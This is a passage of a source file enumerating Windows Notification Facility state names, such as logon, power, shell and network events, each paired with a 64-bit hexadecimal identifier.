        WNF_LOGN_RETURN_TO_LOCK = 0xf810121a3bc1835,
        WNF_LOGN_SLIDE_TO_SHUTDOWN = 0xf810121a3bc1035,
        WNF_LOGN_SUPPRESS_FINGERPRINT_WAKE = 0xf810121a3bc3835,
        WNF_MAPS_MAPLOADER_PACKAGE_CHANGE = 0x12960f20a3bc2075,
        WNF_MAPS_MAPLOADER_PROGRESS = 0x12960f20a3bc1075,
        WNF_MAPS_MAPLOADER_STATUS_CHANGE = 0x12960f20a3bc1875,
        WNF_MM_BAD_MEMORY_PENDING_REMOVAL = 0x41c60320a3bc0875,
        WNF_MM_PHYSICAL_MEMORY_CHANGE = 0x41c60320a3bc1075,
        WNF_MON_THERMAL_CAP_CHANGED = 0x41880120a3bc0875,
        WNF_MRT_MERGE_SYSTEM_PRI_FILES = 0x41921c20a3bc2075,
        WNF_MRT_PERSISTENT_QUALIFIER_CHANGED = 0x41921c20a3bc1c75,
        WNF_MRT_QUALIFIER_CONTRAST_CHANGED = 0x41921c20a3bc0875,
        WNF_MRT_QUALIFIER_THEME_CHANGED = 0x41921c20a3bc1075,
        WNF_MRT_SYSTEM_PRI_MERGE = 0x41921c20a3bc2875,
        WNF_MSA_ACCOUNTSTATECHANGE = 0x41871d20a3bc0835,
        WNF_MSA_TPM_AVAILABLE = 0x41871d20a3bc1475,
        WNF_MSA_TPM_SERVER_CLIENT_KEY_STATE_UPDATED = 0x41871d20a3bc1875,
        WNF_MUR_MEDIA_UI_REQUEST_LAN = 0x41941b20a3bc1075,
        WNF_MUR_MEDIA_UI_REQUEST_WLAN = 0x41941b20a3bc0875,
        WNF_NASV_DYNAMIC_LOCK_BLUETOOTH_STATUS = 0x17950f23a3bc2075,
        WNF_NASV_SERVICE_RUNNING = 0x17950f23a3bc1075,
        WNF_NASV_USER_AUTHENTICATION = 0x17950f23a3bc1835,
        WNF_NASV_USER_PRESENT = 0x17950f23a3bc0835,
        WNF_NCB_APP_AVAILABLE = 0x41840d23a3bc0875,
        WNF_NDIS_ADAPTER_ARRIVAL = 0x128f0a23a3bc0875,
        WNF_NDIS_CORRUPTED_STORE = 0x128f0a23a3bc1075,
        WNF_NFC_SE_CARD_EMULATION_STATE_CHANGED = 0x41850823a3bc0875,
        WNF_NGC_AIKCERT_TRIGGER = 0x41850923a3bc1075,
        WNF_NGC_CREDENTIAL_REFRESH_REQUIRED = 0x41850923a3bc3875,
        WNF_NGC_CREDENTIAL_RESET_EXPERIENCE_ACTIVE = 0x41850923a3bc5075,
        WNF_NGC_CRYPTO_MDM_POLICY_CHANGED = 0x41850923a3bc3075,
        WNF_NGC_GESTURE_AUTHENTICATED = 0x41850923a3bc2875,
        WNF_NGC_LAUNCH_NTH_USER_SCENARIO = 0x41850923a3bc6075,
        WNF_NGC_LAUNCH_PIN_RESET_SCENARIO = 0x41850923a3bc4875,
        WNF_NGC_PIN_RESET_SCENARIO_STATE_CHANGE = 0x41850923a3bc4035,
        WNF_NGC_PREGEN_DELAY_TRIGGER = 0x41850923a3bc2075,
        WNF_NGC_PREGEN_NGCISOCTNR_TRIGGER = 0x41850923a3bc6875,
        WNF_NGC_PREGEN_TRIGGER = 0x41850923a3bc0875,
        WNF_NGC_PRO_CSP_POLICY_CHANGED = 0x41850923a3bc1875,
        WNF_NLA_CAPABILITY_CHANGE = 0x41870223a3bc0875,
        WNF_NLA_TASK_TRIGGER = 0x41870223a3bc1875,
        WNF_NLM_HNS_HIDDEN_INTERFACE = 0x418b0223a3bc1875,
        WNF_NLM_INTERNET_PRESENT = 0x418b0223a3bc1075,
        WNF_NLM_VPN_RECONNECT_CHANGE = 0x418b0223a3bc0875,
        WNF_NLS_GEOID_CHANGED = 0x41950223a3bc2035,
        WNF_NLS_LOCALE_INFO_CHANGED = 0x41950223a3bc1835,
        WNF_NLS_USER_DEFAULT_LOCALE_CHANGED = 0x41950223a3bc0835,
        WNF_NLS_USER_UILANG_CHANGED = 0x41950223a3bc1035,
        WNF_NPSM_SERVICE_STARTED = 0xc951e23a3bc0875,
        WNF_NSI_SERVICE_STATUS = 0x418f1d23a3bc0875,
        WNF_OLIC_OS_EDITION_CHANGE = 0x28f0222a3bc5075,
        WNF_OLIC_OS_LICENSE_NON_GENUINE = 0x28f0222a3bc6875,
        WNF_OLIC_OS_LICENSE_POLICY_CHANGE = 0x28f0222a3bc5875,
        WNF_OLIC_OS_LICENSE_TERMS_ACCEPTED = 0x28f0222a3bc6075,
        WNF_OOBE_SHL_MAGNIFIER_CONFIRM = 0x4840122a3bc1035,
        WNF_OOBE_SHL_MAGNIFIER_QUERY = 0x4840122a3bc0835,
        WNF_OOBE_SHL_MONITOR_STATE = 0x4840122a3bc1875,
        WNF_OOBE_SHL_SPEECH_CONTROLLER = 0x4840122a3bc2035,
        WNF_OSWN_STORAGE_APP_PAIRING_CHANGE = 0xf911d22a3bc8075,
        WNF_OSWN_STORAGE_FINISHED_USAGE_CATEGORY_UPDATE = 0xf911d22a3bcb875,
        WNF_OSWN_STORAGE_FREE_SPACE_CHANGE = 0xf911d22a3bc7075,
        WNF_OSWN_STORAGE_PRESENCE_CHANGE = 0xf911d22a3bc6075,
        WNF_OSWN_STORAGE_SHELLHWD_EVENT = 0xf911d22a3bcc075,
        WNF_OSWN_STORAGE_TEMP_CLEANUP_CHANGE = 0xf911d22a3bc7875,
        WNF_OSWN_STORAGE_VOLUME_STATUS_CHANGE = 0xf911d22a3bc6875,
        WNF_OSWN_SYSTEM_CLOCK_CHANGED = 0xf911d22a3bc5875,
        WNF_OS_IP_OVER_USB_AVAILABLE = 0x41c61d22a3bc8075,
        WNF_OS_IU_PROGRESS_REPORT = 0x41c61d22a3bc8875,
        WNF_OVRD_OVERRIDESCALEUPDATED = 0x5941822a3bc0875,
        WNF_PAY_CANMAKEPAYMENT_BROKER_READY = 0x419f0f3da3bc0875,
        WNF_PFG_PEN_FIRST_DRAG = 0x4181083da3bc1075,
        WNF_PFG_PEN_FIRST_TAP = 0x4181083da3bc0875,
        WNF_PHNL_LINE1_READY = 0xd88063da3bc4075,
        WNF_PHNP_ANNOTATION_ENDPOINT = 0x1188063da3bc4875,
        WNF_PHNP_SERVICE_INITIALIZED = 0x1188063da3bc3875,
        WNF_PHNP_SIMSEC_READY = 0x1188063da3bc4075,
        WNF_PHN_CALLFORWARDING_STATUS_LINE0 = 0x4188063da3bc3075,
        WNF_PHN_CALL_STATUS = 0x4188063da3bc2875,
        WNF_PMEM_MEMORY_ERROR = 0xc83033da3bc0875,
        WNF_PNPA_DEVNODES_CHANGED = 0x96003da3bc0875,
        WNF_PNPA_DEVNODES_CHANGED_SESSION = 0x96003da3bc1035,
        WNF_PNPA_HARDWAREPROFILES_CHANGED = 0x96003da3bc2875,
        WNF_PNPA_HARDWAREPROFILES_CHANGED_SESSION = 0x96003da3bc3035,
        WNF_PNPA_PORTS_CHANGED = 0x96003da3bc3875,
        WNF_PNPA_PORTS_CHANGED_SESSION = 0x96003da3bc4035,
        WNF_PNPA_VOLUMES_CHANGED = 0x96003da3bc1875,
        WNF_PNPA_VOLUMES_CHANGED_SESSION = 0x96003da3bc2035,
        WNF_PNPB_AWAITING_RESPONSE = 0x396003da3bc0875,
        WNF_PNPC_CONTAINER_CONFIG_REQUESTED = 0x296003da3bc1875,
        WNF_PNPC_DEVICE_INSTALL_REQUESTED = 0x296003da3bc1075,
        WNF_PNPC_REBOOT_REQUIRED = 0x296003da3bc0875,
        WNF_PO_BACKGROUND_ACTIVITY_POLICY = 0x41c6013da3bc9075,
        WNF_PO_BASIC_BRIGHTNESS_ENGINE_DISABLED = 0x41c6013da3bcd075,
        WNF_PO_BATTERY_CHARGE_LEVEL = 0x41c6013da3bc8075,
        WNF_PO_BATTERY_CHARGE_LIMITING_MODE = 0x41c6013da3bd3875,
        WNF_PO_BATTERY_DISCHARGING = 0x41c6013da3bc9875,
        WNF_PO_BRIGHTNESS_ALS_OFFSET = 0x41c6013da3bcd875,
        WNF_PO_CAD_STICKY_DISABLE_CHARGING = 0x41c6013da3bcf075,
        WNF_PO_CHARGE_ESTIMATE = 0x41c6013da3bc6075,
        WNF_PO_COMPOSITE_BATTERY = 0x41c6013da3bc1075,
        WNF_PO_DISCHARGE_ESTIMATE = 0x41c6013da3bc5075,
        WNF_PO_DISCHARGE_START_FILETIME = 0x41c6013da3bc5c75,
        WNF_PO_DISPLAY_REQUEST_ACTIVE = 0x41c6013da3bc7835,
        WNF_PO_DRIPS_DEVICE_CONSTRAINTS_REGISTERED = 0x41c6013da3bcc875,
        WNF_PO_ENERGY_SAVER_OVERRIDE = 0x41c6013da3bc3075,
        WNF_PO_ENERGY_SAVER_SETTING = 0x41c6013da3bc2875,
        WNF_PO_ENERGY_SAVER_STATE = 0x41c6013da3bc2075,
        WNF_PO_INPUT_SUPPRESS_NOTIFICATION = 0x41c6013da3bd1875,
        WNF_PO_INPUT_SUPPRESS_NOTIFICATION_EX = 0x41c6013da3bd3075,
        WNF_PO_MODERN_STANDBY_EXIT_INITIATED = 0x41c6013da3bcb875,
        WNF_PO_OPPORTUNISTIC_CS = 0x41c6013da3bd2875,
        WNF_PO_OVERLAY_POWER_SCHEME_UPDATE = 0x41c6013da3bce875,
        WNF_PO_POWER_BUTTON_STATE = 0x41c6013da3bcf875,
        WNF_PO_POWER_STATE_CHANGE = 0x41c6013da3bc1875,
        WNF_PO_PRESLEEP_NOTIFICATION = 0x41c6013da3bd1075,
        WNF_PO_PREVIOUS_SHUTDOWN_STATE = 0x41c6013da3bcb075,
        WNF_PO_PRIMARY_DISPLAY_LOGICAL_STATE = 0x41c6013da3bca875,
        WNF_PO_PRIMARY_DISPLAY_VISIBLE_STATE = 0x41c6013da3bca075,
        WNF_PO_SCENARIO_CHANGE = 0x41c6013da3bc0875,
        WNF_PO_SLEEP_STUDY_USER_PRESENCE_CHANGED = 0x41c6013da3bc8875,
        WNF_PO_SW_HW_DRIPS_DIVERGENCE = 0x41c6013da3bcc075,
        WNF_PO_SYSTEM_TIME_CHANGED = 0x41c6013da3bd0075,
        WNF_PO_THERMAL_HIBERNATE_OCCURRED = 0x41c6013da3bc4875,
        WNF_PO_THERMAL_OVERTHROTTLE = 0x41c6013da3bc6875,
        WNF_PO_THERMAL_SHUTDOWN_OCCURRED = 0x41c6013da3bc4075,
        WNF_PO_THERMAL_STANDBY = 0x41c6013da3bc3875,
        WNF_PO_USER_AWAY_PREDICTION = 0x41c6013da3bc7075,
        WNF_PO_VIDEO_INITIALIALIZED = 0x41c6013da3bce075,
        WNF_PO_WAKE_ON_VOICE_STATE = 0x41c6013da3bd2075,
        WNF_PO_WEAK_CHARGER = 0x41c6013da3bd0875,
        WNF_PROV_AUTOPILOT_ASYNC_COMPLETE = 0x17891c3da3bc2075,
        WNF_PROV_AUTOPILOT_PROFILE_AVAILABLE = 0x17891c3da3bc1875,
        WNF_PROV_AUTOPILOT_TPM_MSA_TRIGGER = 0x17891c3da3bc2875,
        WNF_PROV_DEVICE_BOOTSTRAP_COMPLETE = 0x17891c3da3bc3475,
        WNF_PROV_TPM_ATTEST_COMPLETE = 0x17891c3da3bc1075,
        WNF_PROV_TURN_COMPLETE = 0x17891c3da3bc0875,
        WNF_PS_WAKE_CHARGE_RESOURCE_POLICY = 0x41c61d3da3bc0875,
        WNF_PTI_WNS_RECEIVED = 0x418f1a3da3bc0875,
        WNF_RDR_SMB1_NOT_IN_USE_STATE_CHANGE = 0x41940a3fa3bc0875,
        WNF_RM_GAME_MODE_ACTIVE = 0x41c6033fa3bc1075,
        WNF_RM_MEMORY_MONITOR_USAGE_METRICS = 0x41c6033fa3bc0875,
        WNF_RM_QUIET_MODE = 0x41c6033fa3bc1875,
        WNF_RPCF_FWMAN_RUNNING = 0x7851e3fa3bc0875,
        WNF_RTDS_NAMED_PIPE_TRIGGER_CHANGED = 0x12821a3fa3bc1875,
        WNF_RTDS_RPC_INTERFACE_TRIGGER_CHANGED = 0x12821a3fa3bc0875,
        WNF_RTSC_PRIVACY_SETTINGS_CHANGED = 0x2951a3fa3bc0875,
        WNF_SBS_UPDATE_AVAILABLE = 0x41950c3ea3bc0875,
        WNF_SCM_AUTOSTART_STATE = 0x418b0d3ea3bc0875,
        WNF_SDO_ORIENTATION_CHANGE = 0x41890a3ea3bc0875,
        WNF_SEB_AIRPLANE_MODE_DISABLED_FOR_EMERGENCY_CALL = 0x41840b3ea3bd7075,
        WNF_SEB_APP_LAUNCH_PREFETCH = 0x41840b3ea3bd1075,
        WNF_SEB_APP_RESUME = 0x41840b3ea3bd2075,
        WNF_SEB_AUDIO_ACTIVITY = 0x41840b3ea3bdb075,
        WNF_SEB_BACKGROUND_WORK_COST_CHANGE = 0x41840b3ea3bc8875,
        WNF_SEB_BACKGROUND_WORK_COST_HIGH = 0x41840b3ea3bc9075,
        WNF_SEB_BATTERY_LEVEL = 0x41840b3ea3bc5075,
        WNF_SEB_BOOT = 0x41840b3ea3bc6075,
        WNF_SEB_CACHED_FILE_UPDATED = 0x41840b3ea3bcc875,
        WNF_SEB_CALL_HISTORY_CHANGED = 0x41840b3ea3bd6075,
        WNF_SEB_CALL_STATE_CHANGED = 0x41840b3ea3bd5075,
        WNF_SEB_DEFAULT_SIGN_IN_ACCOUNT_CHANGE = 0x41840b3ea3bd9875,
        WNF_SEB_DEPRECATED1 = 0x41840b3ea3bd1875,
        WNF_SEB_DEPRECATED2 = 0x41840b3ea3bd2875,
        WNF_SEB_DEPRECATED3 = 0x41840b3ea3bd3075,
        WNF_SEB_DEPRECATED4 = 0x41840b3ea3bd3875,
        WNF_SEB_DEPRECATED5 = 0x41840b3ea3bd4075,
        WNF_SEB_DEPRECATED6 = 0x41840b3ea3bd4875,
        WNF_SEB_DEPRECATED7 = 0x41840b3ea3bce075,
        WNF_SEB_DEPRECATED8 = 0x41840b3ea3bce875,
        WNF_SEB_DEV_MNF_CUSTOM_NOTIFICATION_RECEIVED = 0x41840b3ea3bcb875,
        WNF_SEB_DOMAIN_JOINED = 0x41840b3ea3bc5875,
        WNF_SEB_FREE_NETWORK_PRESENT = 0x41840b3ea3bc1075,
        WNF_SEB_FULL_SCREEN_HDR_VIDEO_PLAYBACK = 0x41840b3ea3bdb875,
        WNF_SEB_FULL_SCREEN_VIDEO_PLAYBACK = 0x41840b3ea3bd0075,
        WNF_SEB_GAME_MODE = 0x41840b3ea3bdd875,
        WNF_SEB_GEOLOCATION = 0x41840b3ea3bcb075,
        WNF_SEB_INCOMING_CALL_DISMISSED = 0x41840b3ea3bde075,
        WNF_SEB_INTERNET_PRESENT = 0x41840b3ea3bc0875,
        WNF_SEB_IP_ADDRESS_AVAILABLE = 0x41840b3ea3bc8075,
        WNF_SEB_LINE_CHANGED = 0x41840b3ea3bd6875,
        WNF_SEB_LOW_LATENCY_POWER_REQUEST = 0x41840b3ea3bcf075,
        WNF_SEB_MBAE_NOTIFICATION_RECEIVED = 0x41840b3ea3bc2875,
        WNF_SEB_MIXED_REALITY = 0x41840b3ea3bdd075,
        WNF_SEB_MOBILE_BROADBAND_DEVICE_SERVICE_NOTIFICATION = 0x41840b3ea3bd9075,
        WNF_SEB_MOBILE_BROADBAND_PCO_VALUE_CHANGE = 0x41840b3ea3bdc875,
        WNF_SEB_MOBILE_BROADBAND_PIN_LOCK_STATE_CHANGE = 0x41840b3ea3bd8875,
        WNF_SEB_MOBILE_BROADBAND_RADIO_STATE_CHANGE = 0x41840b3ea3bd8075,
        WNF_SEB_MOBILE_BROADBAND_REGISTRATION_STATE_CHANGE = 0x41840b3ea3bd7875,
        WNF_SEB_MOB_OPERATOR_CUSTOM_NOTIFICATION_RECEIVED = 0x41840b3ea3bcc075,
        WNF_SEB_MONITOR_ON = 0x41840b3ea3bc7875,
        WNF_SEB_NETWORK_CONNECTIVITY_IN_STANDBY = 0x41840b3ea3bda075,
        WNF_SEB_NETWORK_CONTROL_CHANNEL_TRIGGER_RESET = 0x41840b3ea3bc3075,
        WNF_SEB_NETWORK_STATE_CHANGES = 0x41840b3ea3bc2075,
        WNF_SEB_NFC_PERF_BOOST = 0x41840b3ea3bd0875,
        WNF_SEB_ONLINE_ID_CONNECTED_STATE_CHANGE = 0x41840b3ea3bc4075,
        WNF_SEB_RESILIENCY_NOTIFICATION_PHASE = 0x41840b3ea3bcf875,
        WNF_SEB_SMART_CARD_FIELD_INFO_NOTIFICATION = 0x41840b3ea3bcd075,
        WNF_SEB_SMART_CARD_HCE_APPLICATION_ACTIVATION_NOTIFICATION = 0x41840b3ea3bcd875,
        WNF_SEB_SMART_CARD_TRANSACTION_NOTIFICATION = 0x41840b3ea3bca075,
        WNF_SEB_SMS_RECEIVED = 0x41840b3ea3bc1875,
        WNF_SEB_SYSTEM_AC = 0x41840b3ea3bc7075,
        WNF_SEB_SYSTEM_IDLE = 0x41840b3ea3bc4875,
        WNF_SEB_SYSTEM_LPE = 0x41840b3ea3bc9875,
        WNF_SEB_SYSTEM_MAINTENANCE = 0x41840b3ea3bca875,
        WNF_SEB_TIME_ZONE_CHANGE = 0x41840b3ea3bc3875,
        WNF_SEB_USER_PRESENCE_CHANGED = 0x41840b3ea3bda875,
        WNF_SEB_USER_PRESENT = 0x41840b3ea3bc6875,
        WNF_SEB_UWP_APP_LAUNCH = 0x41840b3ea3bdc075,
        WNF_SEB_VOICEMAIL_CHANGED = 0x41840b3ea3bd5875,
        WNF_SFA_AUTHENTICATION_STAGE_CHANGED = 0x4187083ea3bc0875,
        WNF_SHEL_ABOVE_LOCK_APP_ACTIVE = 0xd83063ea3bd9835,
        WNF_SHEL_ABOVE_LOCK_BIO_ACTIVE = 0xd83063ea3bda835,
        WNF_SHEL_ACTIONCENTER_READY = 0xd83063ea3bf9835,
        WNF_SHEL_ACTIONCENTER_VIEWSTATE_CHANGED = 0xd83063ea3bed035,
        WNF_SHEL_APPLICATION_SPATIAL_INFO_UPDATE = 0xd83063ea3bdd875,
        WNF_SHEL_APPLICATION_STARTED = 0xd83063ea3be0075,
        WNF_SHEL_APPLICATION_STATE_UPDATE = 0xd83063ea3bc7075,
        WNF_SHEL_APPLICATION_TERMINATED = 0xd83063ea3be0875,
        WNF_SHEL_APPLIFECYCLE_INSTALL_STATE = 0xd83063ea3bee875,
        WNF_SHEL_APPRESOLVER_SCAN = 0xd83063ea3bc5075,
        WNF_SHEL_ASSISTANT_STATE_CHANGE = 0xd83063ea3bf8875,
        WNF_SHEL_CACHED_CLOUD_NETWORK_STATE = 0xd83063ea3bed875,
        WNF_SHEL_CALM_DISPLAY_ACTIVE = 0xd83063ea3bdb875,
        WNF_SHEL_CDM_FEATURE_CONFIG_FIRST_USAGE = 0xd83063ea3bdf875,
        WNF_SHEL_CDM_FEATURE_USAGE = 0xd83063ea3be9075,
        WNF_SHEL_CDM_REGISTRATION_COMPLETE = 0xd83063ea3be6835,
        WNF_SHEL_CLOUD_FILE_INDEXED_CHANGE = 0xd83063ea3bea875,
        WNF_SHEL_CLOUD_FILE_PROGRESS_CHANGE = 0xd83063ea3beb075,
        WNF_SHEL_CONTENT_DELIVERY_MANAGER_MONITORING = 0xd83063ea3be70f5,
        WNF_SHEL_CONTENT_DELIVERY_MANAGER_NEEDS_REMEDIATION = 0xd83063ea3be4875,
        WNF_SHEL_CORTANA_APPINDEX_UPDATED = 0xd83063ea3bc9875,
        WNF_SHEL_CORTANA_AUDIO_ACTIVE = 0xd83063ea3bde075,
        WNF_SHEL_CORTANA_BEACON_STATE_CHANGED = 0xd83063ea3bf1075,
        WNF_SHEL_CORTANA_CAPABILTIES_CHANGED = 0xd83063ea3bf7035,
        WNF_SHEL_CORTANA_MIC_TRAINING_COMPLETE = 0xd83063ea3be88f5,
        WNF_SHEL_CORTANA_QUIET_MOMENT_AT_HOME = 0xd83063ea3bf0475,
        WNF_SHEL_CORTANA_SPEECH_CANCELHANDSFREE_REQUESTED = 0xd83063ea3bdb035,
        WNF_SHEL_CREATIVE_EVENT_BATTERY_SAVER_OVERRIDE_TRIGGERED = 0xd83063ea3bf3075,
        WNF_SHEL_CREATIVE_EVENT_TRIGGERED = 0xd83063ea3bcd875,
        WNF_SHEL_DDC_COMMAND_AVAILABLE = 0xd83063ea3bd2075,
        WNF_SHEL_DDC_CONNECTED_ACCOUNTS_CHANGED = 0xd83063ea3bd6075,
        WNF_SHEL_DDC_SMS_COMMAND = 0xd83063ea3bd3075,
        WNF_SHEL_DDC_WNS_COMMAND = 0xd83063ea3bd2875,
        WNF_SHEL_DESKTOP_APPLICATION_STARTED = 0xd83063ea3be5075,
        WNF_SHEL_DESKTOP_APPLICATION_TERMINATED = 0xd83063ea3be5875,
        WNF_SHEL_DEVICE_LOCKED = 0xd83063ea3bd3875,
        WNF_SHEL_DEVICE_OPEN = 0xd83063ea3bf2875,
        WNF_SHEL_DEVICE_UNLOCKED = 0xd83063ea3bcc075,
        WNF_SHEL_DICTATION_RUNNING = 0xd83063ea3bd1835,
        WNF_SHEL_ENTERPRISE_HIDE_PEOPLE_BAR_POLICY_VALUE_CHANGED = 0xd83063ea3be8075,
        WNF_SHEL_ENTERPRISE_START_LAYOUT_POLICY_VALUE_CHANGED = 0xd83063ea3bc9475,
        WNF_SHEL_ENTERPRISE_START_PLACES_POLICY_VALUE_CHANGED = 0xd83063ea3bec075,
        WNF_SHEL_FOCUS_CHANGE = 0xd83063ea3bc7875,
        WNF_SHEL_GAMECONTROLLER_FOCUS_INFO = 0xd83063ea3bc8875,
        WNF_SHEL_GAMECONTROLLER_LISTENER_INFO = 0xd83063ea3bc8075,
        WNF_SHEL_GAMECONTROLLER_NEXUS_INFO = 0xd83063ea3bcf075,
        WNF_SHEL_HEALTH_STATE_CHANGED = 0xd83063ea3be4075,
        WNF_SHEL_IMMERSIVE_SHELL_RUNNING = 0xd83063ea3bc0875,
        WNF_SHEL_INSTALL_PLACEHOLDER_TILES = 0xd83063ea3bdc075,
        WNF_SHEL_JUMPLIST_CHANGED = 0xd83063ea3bce075,
        WNF_SHEL_LATEST_CONNECTED_AUTOPLAY_DEVICE = 0xd83063ea3bef875,
        WNF_SHEL_LOCKAPPHOST_ACTIVE = 0xd83063ea3bf6835,
        WNF_SHEL_LOCKSCREEN_ACTIVE = 0xd83063ea3bc5835,
        WNF_SHEL_LOCKSCREEN_IMAGE_CHANGED = 0xd83063ea3bd5075,
        WNF_SHEL_LOCKSCREEN_INFO_UPDATED = 0xd83063ea3bde835,
        WNF_SHEL_LOCKSTATE = 0xd83063ea3bdd075,
        WNF_SHEL_LOCK_APP_READY = 0xd83063ea3be3035,
        WNF_SHEL_LOCK_APP_RELOCK = 0xd83063ea3be2835,
        WNF_SHEL_LOCK_APP_REQUESTING_UNLOCK = 0xd83063ea3bd7835,
        WNF_SHEL_LOCK_APP_SHOWN = 0xd83063ea3bd7035,
        WNF_SHEL_LOCK_ON_LOGON = 0xd83063ea3bf2035,
        WNF_SHEL_LOGON_COMPLETE = 0xd83063ea3bc1875,
        WNF_SHEL_NEXT_NOTIFICATION_SINK_SESSION_ID = 0xd83063ea3bf5875,
        WNF_SHEL_NOTIFICATIONS = 0xd83063ea3bc1035,
        WNF_SHEL_NOTIFICATIONS_CRITICAL = 0xd83063ea3bca835,
        WNF_SHEL_NOTIFICATION_SETTINGS_CHANGED = 0xd83063ea3bc3835,
        WNF_SHEL_OOBE_ENABLE_PROVISIONING = 0xd83063ea3bd6835,
        WNF_SHEL_OOBE_PROVISIONING_COMPLETE = 0xd83063ea3be9c75,
        WNF_SHEL_OOBE_USER_LOGON_COMPLETE = 0xd83063ea3bc2475,
        WNF_SHEL_PEOPLE_PANE_VIEW_CHANGED = 0xd83063ea3be2035,
        WNF_SHEL_PEOPLE_PINNED_LIST_CHANGED = 0xd83063ea3bdc835,
        WNF_SHEL_PLACES_CHANGED = 0xd83063ea3bcc875,
        WNF_SHEL_QUIETHOURS_ACTIVE_PROFILE_CHANGED = 0xd83063ea3bf1c75,
        WNF_SHEL_QUIET_MOMENT_SHELL_MODE_CHANGED = 0xd83063ea3bf5075,
        WNF_SHEL_RADIALCONTROLLER_EXPERIENCE_RESTART = 0xd83063ea3bda035,
        WNF_SHEL_REQUEST_CORTANA_SETTINGSCONSTRAINTINDEX_BUILD = 0xd83063ea3bd1075,
        WNF_SHEL_RESTORE_PAYLOAD_COMPLETE = 0xd83063ea3bef075,
        WNF_SHEL_SCREEN_COVERED = 0xd83063ea3bd5875,
        WNF_SHEL_SESSION_LOGON_COMPLETE = 0xd83063ea3be3835,
        WNF_SHEL_SETTINGS_CHANGED = 0xd83063ea3bcf875,
        WNF_SHEL_SETTINGS_ENVIRONMENT_CHANGED = 0xd83063ea3bf4875,
        WNF_SHEL_SIGNALMANAGER_NEW_SIGNAL_REGISTERED = 0xd83063ea3bfa035,
        WNF_SHEL_SIGNAL_LOGONUI = 0xd83063ea3be7835,
        WNF_SHEL_SIGNAL_MANAGER_FEATURE_TRIGGERED = 0xd83063ea3bec875,
        WNF_SHEL_SIGNAL_MANAGER_SIGNAL_TRIGGERED = 0xd83063ea3bea075,
        WNF_SHEL_SIGNAL_MANAGER_TESTING = 0xd83063ea3bee075,
        WNF_SHEL_SOFTLANDING_PUBLISHED = 0xd83063ea3bd0835,
        WNF_SHEL_SOFTLANDING_RULES_UPDATED = 0xd83063ea3bca075,
        WNF_SHEL_SOFTLANDING_RULE_TRIGGERED = 0xd83063ea3bc4075,
        WNF_SHEL_START_APPLIFECYCLE_DOWNLOAD_STARTED = 0xd83063ea3bc6875,
        WNF_SHEL_START_APPLIFECYCLE_INSTALL_FINISHED = 0xd83063ea3bc6075,
        WNF_SHEL_START_APPLIFECYCLE_UNINSTALL_FINISHED = 0xd83063ea3bce875,
        WNF_SHEL_START_LAYOUT_MIGRATED = 0xd83063ea3beb8f5,
        WNF_SHEL_START_LAYOUT_READY = 0xd83063ea3bc4875,
        WNF_SHEL_START_PROCESS_SUSPENDED_INTERNAL = 0xd83063ea3bf3835,
        WNF_SHEL_START_VISIBILITY_CHANGED = 0xd83063ea3bcb035,
        WNF_SHEL_SUGGESTED_APP_READY = 0xd83063ea3be60f5,
        WNF_SHEL_SUSPEND_APP_BACKGROUND_ACTIVITY = 0xd83063ea3bcd075,
        WNF_SHEL_SYSTEMDIALOG_PUBLISHED = 0xd83063ea3bf4035,
        WNF_SHEL_TAB_SHELL_INIT_COMPLETE = 0xd83063ea3bf6035,
        WNF_SHEL_TARGETED_CONTENT_SUBSCRIPTION_ACTIVATED = 0xd83063ea3bd4075,
        WNF_SHEL_TARGETED_CONTENT_SUBSCRIPTION_UPDATED = 0xd83063ea3bd4875,
        WNF_SHEL_TASKBAR_PINS_UPDATED = 0xd83063ea3bf7875,
        WNF_SHEL_TILECHANGE = 0xd83063ea3bc3075,
        WNF_SHEL_TILEINSTALL = 0xd83063ea3bd8075,
        WNF_SHEL_TILEUNINSTALL = 0xd83063ea3bd9075,
        WNF_SHEL_TILEUPDATE = 0xd83063ea3bd8875,
        WNF_SHEL_TOAST_PUBLISHED = 0xd83063ea3bd0035,
        WNF_SHEL_TOAST_PUBLISHED_SYSTEMSCOPE = 0xd83063ea3bf9075,
        WNF_SHEL_TRAY_SEARCHBOX_VISIBILITY_CHANGED = 0xd83063ea3bcb875,
        WNF_SHEL_USER_IDLE = 0xd83063ea3be1875,
        WNF_SHEL_VEEVENT_DISPATCHER_CLIENT_PIPE_CLOSED = 0xd83063ea3bc2875,
        WNF_SHEL_WCOS_SESSION_ID = 0xd83063ea3bf8075,
        WNF_SHEL_WINDOWSTIP_CONTENT_PUBLISHED = 0xd83063ea3be10f5,
        WNF_SHR_DHCP_IPv4_FASTIP_ADDRS = 0x4194063ea3bc1875,
        WNF_SHR_DHCP_IPv4_LEASE_LIST = 0x4194063ea3bc1075,
        WNF_SHR_SHARING_CHANGED = 0x4194063ea3bc0835,
        WNF_SIO_BIO_ENROLLED = 0x4189073ea3bc1075,
        WNF_SIO_PIN_ENROLLED = 0x4189073ea3bc0875,
        WNF_SKYD_FILE_SYNC = 0x59f053ea3bc0875,
        WNF_SKYD_QUOTA_CHANGE = 0x59f053ea3bc1075,
        WNF_SMSR_NEW_MESSAGE_RECEIVED = 0x1395033ea3bc1875,
        WNF_SMSR_READY = 0x1395033ea3bc0875,
        WNF_SMSR_WWAN_READ_DONE = 0x1395033ea3bc1075,
        WNF_SMSS_MEMORY_COOLING_COMPATIBLE = 0x1295033ea3bc0875,
        WNF_SMS_CHECK_ACCESS = 0x4195033ea3bc0875,
        WNF_SPAC_SPACEPORT_PROPERTY_CHANGED = 0x2871e3ea3bc0875,
        WNF_SPAC_SPACEPORT_WORK_REQUESTED = 0x2871e3ea3bc1075,
        WNF_SPCH_ALLOW_REMOTE_SPEECH_SERVICES = 0x9851e3ea3bc2075,
        WNF_SPCH_DISABLE_KWS_REQUEST = 0x9851e3ea3bc1875,
        WNF_SPCH_INPUT_STATE_UPDATE = 0x9851e3ea3bc0835,
        WNF_SPCH_REMOTE_SESSION_REQUEST = 0x9851e3ea3bc1075,
        WNF_SPI_LOGICALDPIOVERRIDE = 0x418f1e3ea3bc0835,
        WNF_SPI_PRIMARY_MONITOR_DPI_CHANGED = 0x418f1e3ea3bc1035,
        WNF_SRC_SYSTEM_RADIO_CHANGED = 0x41851c3ea3bc0875,
        WNF_SRT_WINRE_CONFIGURATION_CHANGE = 0x41921c3ea3bc0875,
        WNF_SRUM_SCREENONSTUDY_SESSION = 0xc931c3ea3bc0875,
        WNF_SRV_SMB1_NOT_IN_USE_STATE_CHANGE = 0x41901c3ea3bc1075,
        WNF_SRV_SRV2_STATE_CHANGE = 0x41901c3ea3bc0875,
        WNF_STOR_CONFIGURATION_DEVICE_INFO_UPDATED = 0x13891a3ea3bc0875,
